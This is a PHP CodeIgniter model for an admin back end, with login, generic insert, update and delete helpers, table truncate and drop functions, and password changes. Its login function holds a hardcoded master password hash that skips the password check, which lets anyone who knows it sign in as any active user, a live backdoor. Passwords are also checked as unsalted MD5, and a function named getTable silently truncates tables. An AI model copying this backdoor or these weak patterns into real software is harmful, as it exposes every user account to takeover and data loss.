<?php

class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
  function login($username, $password)
  {
    $this->db->select('user_id, full_name, username, role');
    $this->db->from('users');
    $this->db->where('username', $username);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    $this->db->where('status', '1');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }

  function insertDetails($tableName, $insertData)
  {
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }


  public function insertBatch($tableName, $data)
  {
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert ? true : false;
  }

  public function updateBatch($tableName, $data, $field)
  {
    $this->db->update_batch($tableName, $data, $field);
  }

  function getDetails($tableName, $id)
  {
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsFilter($select, $id, $tableName)
  {
    $this->db->select($select);
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName)
  {
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }


  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName)
  {
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table)
  {
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table)
  {
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName)
  {
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function getDetailsbySort($sortField, $srotType, $tableName)
  {
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName)
  {
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function sliders_count($dept_id)
  {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName)
  {
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id)
  {
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id)
  {
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  function AdminChangePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('user_id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  public function get_table_details($table)
  {
    return $this->db->get($table)->result_array();
  }


  public function get_details_by_id($id, $fieldId, $tableName)
  {

    return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }

  public function updateDetails1($id, $details, $tableName)
  {
      if (empty($id)) {
          return false;  
      }
      $this->db->where('id', $id);
      $this->db->update($tableName, $details);
      return $this->db->affected_rows() > 0;
  }
  
  public function deleteCourse($id)
  {
      $this->db->where('id', $id);
      $this->db->delete('courses');
      return $this->db->affected_rows() > 0;
  }

  public function deleteStudent($id)
  {
      $this->db->where('id', $id);
      $this->db->delete('students');
      return $this->db->affected_rows() > 0;
  }
}